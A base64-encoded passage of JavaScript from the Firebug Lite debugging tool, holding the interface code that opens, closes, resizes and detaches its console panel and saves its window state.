iKQ0KICAgICAgICB7DQogICAgICAgICAgICBmb2N1c0NvbW1hbmRMaW5lU3RhdGUgPSAwOw0KICAgICAgICAgICAgbGFzdEZvY3VzZWRQYW5lbE5hbWUgPSBzZWxlY3RlZFBhbmVsTmFtZTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgcGFuZWxUb1NlbGVjdCA9ICJDb25zb2xlIjsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoZm9jdXNDb21tYW5kTGluZVN0YXRlID09IDEpDQogICAgICAgIHsNCiAgICAgICAgICAgIHBhbmVsVG9TZWxlY3QgPSBsYXN0Rm9jdXNlZFBhbmVsTmFtZTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgdGhpcy5zZWxlY3RQYW5lbChwYW5lbFRvU2VsZWN0KTsNCiAgICAgICAgDQogICAgICAgIHRyeQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoRmlyZWJ1Zy5Db21tYW5kTGluZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAocGFuZWxUb1NlbGVjdCA9PSAiQ29uc29sZSIpDQogICAgICAgICAgICAgICAgICAgIEZpcmVidWcuQ29tbWFuZExpbmUuZm9jdXMoKTsNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIEZpcmVidWcuQ29tbWFuZExpbmUuYmx1cigpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGNhdGNoKGUpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vVE9ETzogeHh4cGVkcm8gdHJhY2UgZXJyb3INCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgZm9jdXNDb21tYW5kTGluZVN0YXRlID0gKytmb2N1c0NvbW1hbmRMaW5lU3RhdGUgJSAyOw0KICAgIH0NCiAgICANCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIENocm9tZUZyYW1lQmFzZQ0KDQovKioNCiAqIEBuYW1lc3BhY2UNCiAqIEBleHRlbmRzIG5zLWNocm9tZS1DaHJvbWVCYXNlIA0KICovIA0KdmFyIENocm9tZUZyYW1lQmFzZSA9IGV4dGVuZChDaHJvbWVCYXNlLA0KLyoqQGV4dGVuZCBucy1jaHJvbWUtQ2hyb21lRnJhbWVCYXNlKi8NCnsNCiAgICBjcmVhdGU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIENocm9tZUJhc2UuY3JlYXRlLmNhbGwodGhpcyk7DQogICAgICAgIA0KICAgICAgICAvLyByZXN0b3JlIGRpc3BsYXkgZm9yIHRoZSBhbnRpLWZsaWNrZXIgdHJpY2sNCiAgICAgICAgaWYgKGlzRmlyZWZveCkNCiAgICAgICAgICAgIHRoaXMubm9kZS5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsNCiAgICAgICAgDQogICAgICAgIGlmIChFbnYuT3B0aW9ucy5zdGFydEluTmV3V2luZG93KQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLmNsb3NlKCk7DQogICAgICAgICAgICB0aGlzLnRvZ2dsZSh0cnVlLCB0cnVlKTsNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgaWYgKEVudi5PcHRpb25zLnN0YXJ0T3BlbmVkKQ0KICAgICAgICAgICAgdGhpcy5vcGVuKCk7DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHRoaXMuY2xvc2UoKTsNCiAgICB9LA0KICAgIA0KICAgIGRlc3Ryb3k6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHZhciBzaXplID0gRmlyZWJ1Zy5jaHJvbWUuZ2V0V2luZG93U2l6ZSgpOw0KICAgICAgICANCiAgICAgICAgRmlyZWJ1Zy5jb250ZXh0LnBlcnNpc3RlZFN0YXRlLmhlaWdodCA9IHNpemUuaGVpZ2h0Ow0KICAgICAgICANCiAgICAgICAgaWYgKEZpcmVidWcuc2F2ZUNvb2tpZXMpDQogICAgICAgICAgICBGaXJlYnVnLnNhdmVQcmVmcygpOw0KICAgICAgICANCiAgICAgICAgcmVtb3ZlR2xvYmFsRXZlbnQoImtleWRvd24iLCBvbkdsb2JhbEtleURvd24pOw0KICAgICAgICANCiAgICAgICAgQ2hyb21lQmFzZS5kZXN0cm95LmNhbGwodGhpcyk7DQogICAgICAgIA0KICAgICAgICB0aGlzLmRvY3VtZW50ID0gbnVsbDsNCiAgICAgICAgZGVsZXRlIHRoaXMuZG9jdW1lbnQ7DQogICAgICAgIA0KICAgICAgICB0aGlzLndpbmRvdyA9IG51bGw7DQogICAgICAgIGRlbGV0ZSB0aGlzLndpbmRvdzsNCiAgICAgICAgDQogICAgICAgIHRoaXMubm9kZS5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKHRoaXMubm9kZSk7DQogICAgICAgIHRoaXMubm9kZSA9IG51bGw7DQogICAgICAgIGRlbGV0ZSB0aGlzLm5vZGU7DQogICAgfSwNCiAgICANCiAgICBpbml0aWFsaXplOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICAvL0ZCVHJhY2Uuc3lzb3V0KCJGcmFtZSIsICJpbml0aWFsaXplKCk7IikNCiAgICAgICAgQ2hyb21lQmFzZS5pbml0aWFsaXplLmNhbGwodGhpcyk7DQogICAgICAgIA0KICAgICAgICB0aGlzLmFkZENvbnRyb2xsZXIoDQogICAgICAgICAgICBbRmlyZWJ1Zy5icm93c2VyLndpbmRvdywgInJlc2l6ZSIsIHRoaXMucmVzaXplXSwNCiAgICAgICAgICAgIFskKCJmYldpbmRvd19idENsb3NlIiksICJjbGljayIsIHRoaXMuY2xvc2VdLA0KICAgICAgICAgICAgWyQoImZiV2luZG93X2J0RGV0YWNoIiksICJjbGljayIsIHRoaXMuZGV0YWNoXSwgICAgICAgDQogICAgICAgICAgICBbJCgiZmJXaW5kb3dfYnREZWFjdGl2YXRlIiksICJjbGljayIsIHRoaXMuZGVhY3RpdmF0ZV0gICAgICAgDQogICAgICAgICk7DQogICAgICAgIA0KICAgICAgICBpZiAoIUVudi5PcHRpb25zLmVuYWJsZVBlcnNpc3RlbnQpDQogICAgICAgICAgICB0aGlzLmFkZENvbnRyb2xsZXIoW0ZpcmVidWcuYnJvd3Nlci53aW5kb3csICJ1bmxvYWQiLCBGaXJlYnVnLnNodXRkb3duXSk7DQogICAgICAgIA0KICAgICAgICBpZiAobm9GaXhlZFBvc2l0aW9uKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLmFkZENvbnRyb2xsZXIoDQogICAgICAgICAgICAgICAgW0ZpcmVidWcuYnJvd3Nlci53aW5kb3csICJzY3JvbGwiLCB0aGlzLmZpeElFUG9zaXRpb25dDQogICAgICAgICAgICApOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBmYlZTcGxpdHRlci5vbm1vdXNlZG93biA9IG9uVlNwbGl0dGVyTW91c2VEb3duOw0KICAgICAgICBmYkhTcGxpdHRlci5vbm1vdXNlZG93biA9IG9uSFNwbGl0dGVyTW91c2VEb3duOw0KICAgICAgICANCiAgICAgICAgdGhpcy5pc0luaXRpYWxpemVkID0gdHJ1ZTsNCiAgICB9LA0KICAgIA0KICAgIHNodXRkb3duOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBmYlZTcGxpdHRlci5vbm1vdXNlZG93biA9IG51bGw7DQogICAgICAgIGZiSFNwbGl0dGVyLm9ubW91c2Vkb3duID0gbnVsbDsNCiAgICAgICAgDQogICAgICAgIENocm9tZUJhc2Uuc2h1dGRvd24uYXBwbHkodGhpcyk7DQogICAgICAgIA0KICAgICAgICB0aGlzLmlzSW5pdGlhbGl6ZWQgPSBmYWxzZTsNCiAgICB9LA0KICAgIA0KICAgIHJlYXR0YWNoOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICB2YXIgZnJhbWUgPSBGaXJlYnVnQ2hyb21lLmNocm9tZU1hcC5mcmFtZTsNCiAgICAgICAgDQogICAgICAgIENocm9tZUJhc2UucmVhdHRhY2goRmlyZWJ1Z0Nocm9tZS5jaHJvbWVNYXAucG9wdXAsIHRoaXMpOw0KICAgIH0sDQogICAgDQogICAgb3BlbjogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgaWYgKCFGaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUuaXNPcGVuKQ0KICAgICAgICB7DQogICAgICAgICAgICBGaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUuaXNPcGVuID0gdHJ1ZTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKEVudi5pc0Nocm9tZUV4dGVuc2lvbikNCiAgICAgICAgICAgICAgICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgiRmlyZWJ1ZyIsICIxLDEiKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdmFyIG5vZGUgPSB0aGlzLm5vZGU7DQogICAgICAgICAgICANCiAgICAgICAgICAgIG5vZGUuc3R5bGUudmlzaWJpbGl0eSA9ICJoaWRkZW4iOyAvLyBBdm9pZCBmbGlja2VyaW5nDQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIChGaXJlYnVnLnNob3dJY29uV2hlbkhpZGRlbikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoQ2hyb21lTWluaS5pc0luaXRpYWxpemVkKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgQ2hyb21lTWluaS5zaHV0ZG93bigpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICBub2RlLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOw0KICAgICAgICAgICAgDQogICAgICAgICAgICB2YXIgbWFpbiA9ICQoImZiQ2hyb21lIik7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIElFNiB0aHJvd3MgYW4gZXJyb3Igd2hlbiBzZXR0aW5nIHRoaXMgcHJvcGVydHkhIHdoeT8NCiAgICAgICAgICAgIC8vbWFpbi5zdHlsZS5kaXNwbGF5ID0gInRhYmxlIjsNCiAgICAgICAgICAgIG1haW4uc3R5bGUuZGlzcGxheSA9ICIiOw0KICAgICAgICAgICAgDQogICAgICAgICAgICB2YXIgc2VsZiA9IHRoaXM7DQogICAgICAgICAgICAgICAgLy8vIFRPRE86IHh4eHBlZHJvIEZPVUMNCiAgICAgICAgICAgICAgICBub2RlLnN0eWxlLnZpc2liaWxpdHkgPSAidmlzaWJsZSI7DQogICAgICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7DQogICAgICAgICAgICAgICAgLy8vbm9kZS5zdHlsZS52aXNpYmlsaXR5ID0gInZpc2libGUiOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIC8vZGlzcGF0Y2goRmlyZWJ1Zy5tb2R1bGVzLCAiaW5pdGlhbGl6ZSIsIFtdKTsNCiAgICAgICAgICAgICAgICBzZWxmLmluaXRpYWxpemUoKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAobm9GaXhlZFBvc2l0aW9uKQ0KICAgICAgICAgICAgICAgICAgICBzZWxmLmZpeElFUG9zaXRpb24oKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBzZWxmLmRyYXcoKTsNCiAgICAgICAgDQogICAgICAgICAgICB9LCAxMCk7DQogICAgICAgIH0NCiAgICB9LA0KICAgIA0KICAgIGNsb3NlOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBpZiAoRmlyZWJ1Zy5jb250ZXh0LnBlcnNpc3RlZFN0YXRlLmlzT3BlbikNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKHRoaXMuaXNJbml0aWFsaXplZCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAvL2Rpc3BhdGNoKEZpcmVidWcubW9kdWxlcywgInNodXRkb3duIiwgW10pOw0KICAgICAgICAgICAgICAgIHRoaXMuc2h1dGRvd24oKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgRmlyZWJ1Zy5jb250ZXh0LnBlcnNpc3RlZFN0YXRlLmlzT3BlbiA9IGZhbHNlOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoRW52LmlzQ2hyb21lRXh0ZW5zaW9uKQ0KICAgICAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJGaXJlYnVnIiwgIjEsMCIpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICB2YXIgbm9kZSA9IHRoaXMubm9kZTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKEZpcmVidWcuc2hvd0ljb25XaGVuSGlkZGVuKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIG5vZGUuc3R5bGUudmlzaWJpbGl0eSA9ICJoaWRkZW4iOyAvLyBBdm9pZCBmbGlja2VyaW5nDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gLSBwZXJzaXN0IElFIGZpeGVkPyANCiAgICAgICAgICAgICAgICB2YXIgbWFpbiA9ICQoImZiQ2hyb21lIiwgRmlyZWJ1Z0Nocm9tZS5jaHJvbWVNYXAuZnJhbWUuZG9jdW1lbnQpOw0KICAgICAgICAgICAgICAgIG1haW4uc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIENocm9tZU1pbmkuaW5pdGlhbGl6ZSgpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIG5vZGUuc3R5bGUudmlzaWJpbGl0eSA9ICJ2aXNpYmxlIjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICBub2RlLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgICAgIH0NCiAgICB9LA0KICAgIA0KICAgIGRlYWN0aXZhdGU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIC8vIGlmIGl0IGlzIHJ1bm5pbmcgYXMgYSBDaHJvbWUgZXh0ZW5zaW9uLCBkaXNwYXRjaCBhIG1lc3NhZ2UgdG8gdGhlIGV4dGVuc2lvbiBzaWduYWxpbmcNCiAgICAgICAgLy8gdGhhdCBGaXJlYnVnIHNob3VsZCBiZSBkZWFjdGl2YXRlZCBmb3IgdGhlIGN1cnJlbnQgdGFiDQogICAgICAgIGlmIChFbnYuaXNDaHJvbWVFeHRlbnNpb24pDQogICAgICAgIHsNCiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCJGaXJlYnVnIik7DQogICAgICAgICAgICBGaXJlYnVnLkdvb2dsZUNocm9tZS5kaXNwYXRjaCgiRkJfZGVhY3RpdmF0ZSIpOw0KDQogICAgICAgICAgICAvLyB4eHhwZWRybyBwcm9ibGVtIGhlcmUgcmVnYXJkaW5nIENocm9tZSBleHRlbnNpb24uIFdlIGNhbid0IGRlYWN0aXZhdGUgdGhlIHdob2xlDQogICAgICAgICAgICAvLyBhcHAsIG90aGVyd2lzZSBpdCB3b24ndCBiZSBhYmxlIHRvIGJlIHJlYWN0aXZhdGVkIHdpdGhvdXQgcmVsb2FkaW5nIHRoZSBwYWdlLg0KICAgICAgICAgICAgLy8gYnV0IHdlIG5lZWQgdG8gc3RvcCBsaXN0ZW5pbmcgZ2xvYmFsIGtleXMsIG90aGVyd2lzZSB0aGUga2V5IGFjdGl2YXRpb24gd29uJ3Qgd29yay4NCiAgICAgICAgICAgIEZpcmVidWcuY2hyb21lLmNsb3NlKCk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICBGaXJlYnVnLnNodXRkb3duKCk7DQogICAgICAgIH0NCiAgICB9LA0KICAgIA0KICAgIGZpeElFUG9zaXRpb246IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIC8vIGZpeCBJRSBwcm9ibGVtIHdpdGggb2Zmc2V0IHdoZW4gbm90IGluIGZ1bGxzY3JlZW4gbW9kZQ0KICAgICAgICB2YXIgZG9jID0gdGhpcy5kb2N1bWVudDsNCiAgICAgICAgdmFyIG9mZnNldCA9IGlzSUUgPyBkb2MuYm9keS5jbGllbnRUb3AgfHwgZG9jLmRvY3VtZW50RWxlbWVudC5jbGllbnRUb3A6IDA7DQogICAgICAgIA0KICAgICAgICB2YXIgc2l6ZSA9IEZpcmVidWcuYnJvd3Nlci5nZXRXaW5kb3dTaXplKCk7DQogICAgICAgIHZhciBzY3JvbGwgPSBGaXJlYnVnLmJyb3dzZXIuZ2V0V2luZG93U2Nyb2xsUG9zaXRpb24oKTsNCiAgICAgICAgdmFyIG1heEhlaWdodCA9IHNpemUuaGVpZ2h0Ow0KICAgICAgICB2YXIgaGVpZ2h0ID0gdGhpcy5ub2RlLm9mZnNldEhlaWdodDsNCiAgICAgICAgDQogICAgICAgIHZhciBib2R5U3R5bGUgPSBkb2MuYm9keS5jdXJyZW50U3R5bGU7DQogICAgICAgIA0KICAgICAgICB0aGlzLm5vZGUuc3R5bGUudG9wID0gbWF4SGVpZ2h0IC0gaGVpZ2h0ICsgc2Nyb2xsLnRvcCArICJweCI7DQogICAgICAgIA0KICAgICAgICBpZiAoKHRoaXMudHlwZSA9PSAiZnJhbWUiIHx8IHRoaXMudHlwZSA9PSAiZGl2IikgJiYgDQogICAgICAgICAgICAoYm9keVN0eWxlLm1hcmdpbkxlZnQgfHwgYm9keVN0eWxlLm1hcmdpblJpZ2h0KSkNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5ub2RlLnN0eWxlLndpZHRoID0gc2l6ZS53aWR0aCArICJweCI7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIGlmIChmYlZTcGxpdHRlclN0eWxlKQ0KICAgICAgICAgICAgZmJWU3BsaXR0ZXJTdHlsZS5yaWdodCA9IEZpcmVidWcuY29udGV4dC5wZXJzaXN0ZWRTdGF0ZS5zaWRlUGFuZWxXaWR0aCArICJweCI7DQogICAgICAgIA0KICAgICAgICB0aGlzLmRyYXcoKTsNCiAgICB9DQoNCn0pOw0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gQ2hyb21lTWluaQ0KDQovKioNCiAqIEBuYW1lc3BhY2UNCiAqIEBleHRlbmRzIEZCTC5Db250cm9sbGVyDQogKi8gIA0KdmFyIENocm9tZU1pbmkgPSBleHRlbmQoQ29udHJvbGxlciwNCi8qKkBleHRlbmQgbnMtY2hyb21lLUNocm9tZU1pbmkqLyANCnsNCiAgICBjcmVhdGU6IGZ1bmN0aW9uKGNocm9tZSkNCiAgICB7DQogICAgICAgIGFwcGVuZCh0aGlzLCBjaHJvbWUpOw0KICAgICAgICB0aGlzLnR5cGUgPSAibWluaSI7DQogICAgfSwNCiAgICANCiAgICBpbml0aWFsaXplOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBDb250cm9sbGVyLmluaXRpYWxpemUuYXBwbHkodGhpcyk7DQogICAgICAgIA0KICAgICAgICB2YXIgZG9jID0gRmlyZWJ1Z0Nocm9tZS5jaHJvbWVNYXAuZnJhbWUuZG9jdW1lbnQ7DQogICAgICAgIA0KICAgICAgICB2YXIgbWluaSA9ICQoImZiTWluaUNocm9tZSIsIGRvYyk7DQogICAgICAgIG1pbmkuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7DQogICAgICAgIA0KICAgICAgICB2YXIgbWluaUljb24gPSAkKCJmYk1pbmlJY29uIiwgZG9jKTsNCiAgICAgICAgdmFyIHdpZHRoID0gbWluaUljb24ub2Zmc2V0V2lkdGggKyAxMDsNCiAgICAgICAgbWluaUljb24udGl0bGUgPSAiT3BlbiAiICsgRmlyZWJ1Zy52ZXJzaW9uOw0KICAgICAgICANCiAgICAgICAgdmFyIGVycm9ycyA9ICQoImZiTWluaUVycm9ycyIsIGRvYyk7DQogICAgICAgIGlmIChlcnJvcnMub2Zmc2V0V2lkdGgpDQogICAgICAgICAgICB3aWR0aCArPSBlcnJvcnMub2Zmc2V0V2lkdGggKyAxMDsNCiAgICAgICAgDQogICAgICAgIHZhciBub2RlID0gdGhpcy5ub2RlOw0KICAgICAgICBub2RlLnN0eWxlLmhlaWdodCA9ICIyN3B4IjsNCiAgICAgICAgbm9kZS5zdHlsZS53aWR0aCA9IHdpZHRoICsgInB4IjsNCiAgICAgICAgbm9kZS5zdHlsZS5sZWZ0ID0gIiI7DQogICAgICAgIG5vZGUuc3R5bGUucmlnaHQgPSAwOw0KICAgICAgICANCiAgICAgICAgaWYgKHRoaXMubm9kZS5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpID09ICJpZnJhbWUiKQ0KICAgICAgICB7DQogICAgICAgICAgICBub2RlLnNldEF0dHJpYnV0ZSgiYWxsb3dUcmFuc3BhcmVuY3kiLCAidHJ1ZSIpOw0KICAgICAgICAgICAgdGhpcy5kb2N1bWVudC5ib2R5LnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJ0cmFuc3BhcmVudCI7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgbm9kZS5zdHlsZS5iYWNrZ3JvdW5kID0gInRyYW5zcGFyZW50IjsNCg0KICAgICAgICBpZiAobm9GaXhlZFBvc2l0aW9uKQ0KICAgICAgICAgICAgdGhpcy5maXhJRVBvc2l0aW9uKCk7DQogICAgICAgIA0KICAgICAgICB0aGlzLmFkZENvbnRyb2xsZXIoDQogICAgICAgICAgICBbJCgiZmJNaW5pSWNvbiIsIGRvYyksICJjbGljayIsIG9uTWluaUljb25DbGlja10gICAgICAgDQogICAgICAgICk7DQogICAgICAgIA0KICAgICAgICBpZiAobm9GaXhlZFBvc2l0aW9uKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLmFkZENvbnRyb2xsZXIoDQogICAgICAgICAgICAgICAgW0ZpcmVidWcuYnJvd3Nlci53aW5kb3csICJzY3JvbGwiLCB0aGlzLmZpeElFUG9zaXRpb25dDQogICAgICAgICAgICApOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICB0aGlzLmlzSW5pdGlhbGl6ZWQgPSB0cnVlOw0KICAgIH0sDQogICAgDQogICAgc2h1dGRvd246IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHZhciBub2RlID0gdGhpcy5ub2RlOw0KICAgICAgICBub2RlLnN0eWxlLmhlaWdodCA9IEZpcmVidWcuY29udGV4dC5wZXJzaXN0ZWRTdGF0ZS5oZWlnaHQgKyAicHgiOw0KICAgICAgICBub2RlLnN0eWxlLndpZHRoID0gIjEwMCUiOw0KICAgICAgICBub2RlLnN0eWxlLmxlZnQgPSAwOw0KICAgICAgICBub2RlLnN0eWxlLnJpZ2h0ID0gIiI7DQogICAgICAgIA0KICAgICAgICBpZiAodGhpcy5ub2RlLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkgPT0gImlmcmFtZSIpDQogICAgICAgIHsNCiAgICAgICAgICAgIG5vZGUuc2V0QXR0cmlidXRlKCJhbGxvd1RyYW5zcGFyZW5jeSIsICJmYWxzZSIpOw0KICAgICAgICAgICAgdGhpcy5kb2N1bWVudC5ib2R5LnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZmZmIjsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgICAgICBub2RlLnN0eWxlLmJhY2tncm91bmQgPSAiI2ZmZiI7DQogICAgICAgIA0KICAgICAgICBpZiAobm9GaXhlZFBvc2l0aW9uKQ0KICAgICAgICAgICAgdGhpcy5maXhJRVBvc2l0aW9uKCk7DQogICAgICAgIA0KICAgICAgICB2YXIgZG9jID0gRmlyZWJ1Z0Nocm9tZS5jaHJvbWVNYXAuZnJhbWUuZG9jdW1lbnQ7DQogICAgICAgIA0KICAgICAgICB2YXIgbWluaSA9ICQoImZiTWluaUNocm9tZSIsIGRvYyk7DQogICAgICAgIG1pbmkuc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCiAgICAgICAgDQogICAgICAgIENvbnRyb2xsZXIuc2h1dGRvd24uYXBwbHkodGhpcyk7DQogICAgICAgIA0KICAgICAgICB0aGlzLmlzSW5pdGlhbGl6ZWQgPSBmYWxzZTsNCiAgICB9LA0KICAgIA0KICAgIGRyYXc6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgDQogICAgfSwNCiAgICANCiAgICBmaXhJRVBvc2l0aW9uOiBDaHJvbWVGcmFtZUJhc2UuZml4SUVQb3NpdGlvbg0KICAgIA0KfSk7DQoNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBDaHJvbWVQb3B1cEJhc2UNCg0KLyoqDQogKiBAbmFtZXNwYWNlDQogKiBAZXh0ZW5kcyBucy1jaHJvbWUtQ2hyb21lQmFzZQ0KICovICANCnZhciBDaHJvbWVQb3B1cEJhc2UgPSBleHRlbmQoQ2hyb21lQmFzZSwNCi8qKkBleHRlbmQgbnMtY2hyb21lLUNocm9tZVBvcHVwQmFzZSovDQp7DQogICAgDQogICAgaW5pdGlhbGl6ZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgc2V0Q2xhc3ModGhpcy5kb2N1bWVudC5ib2R5LCAiRmlyZWJ1Z1BvcHVwIik7DQogICAgICAgIA0KICAgICAgICBDaHJvbWVCYXNlLmluaXRpYWxpemUuY2FsbCh0aGlzKTsNCiAgICAgICAgDQogICAgICAgIHRoaXMuYWRkQ29udHJvbGxlcigNCiAgICAgICAgICAgIFtGaXJlYnVnLmNocm9tZS53aW5kb3csICJyZXNpemUiLCB0aGlzLnJlc2l6ZV0sDQogICAgICAgICAgICBbRmlyZWJ1Zy5jaHJvbWUud2luZG93LCAidW5sb2FkIiwgdGhpcy5kZXN0cm95XQ0KICAgICAgICAgICAgLy9bRmlyZWJ1Zy5jaHJvbWUud2luZG93LCAiYmVmb3JldW5sb2FkIiwgdGhpcy5kZXN0cm95XQ0KICAgICAgICApOw0KICAgICAgICANCiAgICAgICAgaWYgKEVudi5PcHRpb25zLmVuYWJsZVBlcnNpc3RlbnQpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRoaXMucGVyc2lzdCA9IGJpbmQodGhpcy5wZXJzaXN0LCB0aGlzKTsNCiAgICAgICAgICAgIGFkZEV2ZW50KEZpcmVidWcuYnJvd3Nlci53aW5kb3csICJ1bmxvYWQiLCB0aGlzLnBlcnNpc3QpOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHRoaXMuYWRkQ29udHJvbGxlcigNCiAgICAgICAgICAgICAgICBbRmlyZWJ1Zy5icm93c2VyLndpbmRvdywgInVubG9hZCIsIHRoaXMuY2xvc2VdDQogICAgICAgICAgICApOw0KICAgICAgICANCiAgICAgICAgZmJWU3BsaXR0ZXIub25tb3VzZWRvd24gPSBvblZTcGxpdHRlck1vdXNlRG93bjsNCiAgICB9LA0KICAgIA0KICAgIGRlc3Ryb3k6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHZhciBjaHJvbWVXaW4gPSBGaXJlYnVnLmNocm9tZS53aW5kb3c7IA0KICAgICAgICB2YXIgbGVmdCA9IGNocm9tZVdpbi5zY3JlZW5YIHx8IGNocm9tZVdpbi5zY3JlZW5MZWZ0Ow0KICAgICAgICB2YXIgdG9wID0gY2hyb21lV2luLnNjcmVlblkgfHwgY2hyb21lV2luLnNjcmVlblRvcDsNCiAgICAgICAgdmFyIHNpemUgPSBGaXJlYnVnLmNocm9tZS5nZXRXaW5kb3dTaXplKCk7DQogICAgICAgIA0KICAgICAgICBGaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUucG9wdXBUb3AgPSB0b3A7DQogICAgICAgIEZpcmVidWcuY29udGV4dC5wZXJzaXN0ZWRTdGF0ZS5wb3B1cExlZnQgPSBsZWZ0Ow0KICAgICAgICBGaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUucG9wdXBXaWR0aCA9IHNpemUud2lkdGg7DQogICAgICAgIEZpcmVidWcuY29udGV4dC5wZXJzaXN0ZWRTdGF0ZS5wb3B1cEhlaWdodCA9IHNpemUuaGVpZ2h0Ow0KICAgICAgICANCiAgICAgICAgaWYgKEZpcmVidWcuc2F2ZUNvb2tpZXMpDQogICAgICAgICAgICBGaXJlYnVnLnNhdmVQcmVmcygpOw0KICAgICAgICANCiAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gc3luYyBkZXRhY2ggcmVhdHRhY2ggYXR0YWNoDQogICAgICAgIHZhciBmcmFtZSA9IEZpcmVidWdDaHJvbWUuY2hyb21lTWFwLmZyYW1lOw0KICAgICAgICANCiAgICAgICAgaWYoZnJhbWUpDQogICAgICAgIHsNCiAgICAgICAgICAgIGRpc3BhdGNoKGZyYW1lLnBhbmVsTWFwLCAiZGV0YWNoIiwgW3RoaXMsIGZyYW1lXSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGZyYW1lLnJlYXR0YWNoKHRoaXMsIGZyYW1lKTsN